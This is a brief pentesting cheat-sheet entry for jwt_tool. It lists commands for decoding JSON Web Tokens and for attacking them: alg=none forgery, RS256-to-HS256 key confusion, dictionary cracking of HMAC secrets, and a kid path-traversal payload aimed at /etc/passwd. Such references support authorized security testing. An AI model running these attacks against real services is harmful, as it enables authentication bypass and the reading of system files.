# 02.04 jwt_tool

> JWT inspector, tampering tool, and exploit suite — alg none, key confusion, kid injection, secret cracking.

## Overview

jwt_tool decodes JWTs, attempts common attacks automatically (alg=none, weak HMAC secret, key confusion RS256→HS256, kid path traversal, SQL injection in kid), and lets you tamper claims manually. The go-to tool for JWT vulnerability testing.

## Steps

- **Step 1** - Clone from GitHub.
- **Step 2** - Pass a captured JWT.
- **Step 3** - Try automated playbook with `-M pb`.

## Commands

### Install

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install termcolor cprint pycryptodomex requests
```

### Decode JWT

```bash
python3 jwt_tool.py <TOKEN>
```

### All-attacks playbook

```bash
python3 jwt_tool.py -M pb <TOKEN>
```

### alg=none forgery

```bash
python3 jwt_tool.py -X a <TOKEN>
```

### Key confusion (RS→HS)

```bash
# Need server public key — extract from /.well-known/jwks.json
python3 jwt_tool.py -X k -pk pubkey.pem <TOKEN>
```

### HMAC secret crack

```bash
python3 jwt_tool.py -C -d /usr/share/wordlists/jwt.secrets.list <TOKEN>
```

### kid path traversal

```bash
python3 jwt_tool.py -X kid -I -hc kid -hv '../../../../etc/passwd' <TOKEN>
```
